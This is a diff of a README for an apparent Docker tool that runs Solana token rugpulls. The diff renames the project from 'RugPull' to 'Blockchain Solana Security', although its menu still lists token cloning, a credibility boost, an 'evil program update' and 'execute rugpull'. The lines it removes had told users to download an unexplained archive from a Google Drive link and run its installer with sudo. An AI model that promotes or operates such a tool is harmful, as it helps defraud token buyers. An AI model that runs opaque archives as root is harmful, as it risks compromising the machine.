@@ -6,43 +6,13 @@
  
 
 ```markdown
-# 🚀 RugPull Solana - Interactive Docker Tool - THE LESS YOU KNOW THE BETTER IS  !
+# 🚀 Blockchain Solana Security - Interactive Docker Tool - THE LESS YOU KNOW THE BETTER IS  !
 ```
 
 # <img src="https://github.com/user-attachments/assets/281b4061-e87f-4c25-b62c-46fa20ad86f1" width="5%" height="30%" style="margin: 0 10px;" alt="Blockchain Solana"> Setup
 
 
 > Interactive demonstration of Solana token rugpull mechanics with Docker containerization
-
-## 🛠 Installation
-
-### Prerequisites
-- Linux/macOS terminal
-- Docker installed (will be auto-installed if missing)
-
-### Quick Start
-
-# 1. Download packages files
-```
-pip install gdown
-gdown "https://drive.google.com/uc?id=1Cd0Y-rDX71rhMyCxf_oZwTw_SCX1tDhW" -O prg-projet.tar
-```
-
-# 2. Make scripts executable
-```
-chmod +x installer.sh start.sh
-```
-
-# 3. Run automated installation
-```
-sudo ./installer.sh
-```
-
-# 4. Launch interactive menu
-```
-./start.sh
-```
-# 🐳 Projet RugPull - Setup Docker
 
 ## 📦 Prérequis
 
@@ -93,7 +63,6 @@ docker run -it --name prg-image \
   💰  Token cloning (Step 1)
   💧  Add liquidity (Bonus)
   ✨  Credibility boost (Bonus)
-  🤖  Trading bot simulation
   😈  Evil program update
   💥  Execute rugpull (Step 5)
   🚀  Full scenario execution
@@ -149,5 +118,5 @@ docker run -it --name prg-image \
 **The developers disclaim all liability for illegal use.**  
 ---
 <p align="left">
-  <img src="https://github.com/user-attachments/assets/d4920bb4-8235-4d5f-a97a-3b5e90cb8c0b" width="40%" style="margin: 0 10px;" alt="titre">
+  <img src="https://github.com/user-attachments/assets/1941d5a4-c2fc-4965-a26c-1c43bf26c95a" width="40%" style="margin: 0 10px;" alt="titre">
 </p>
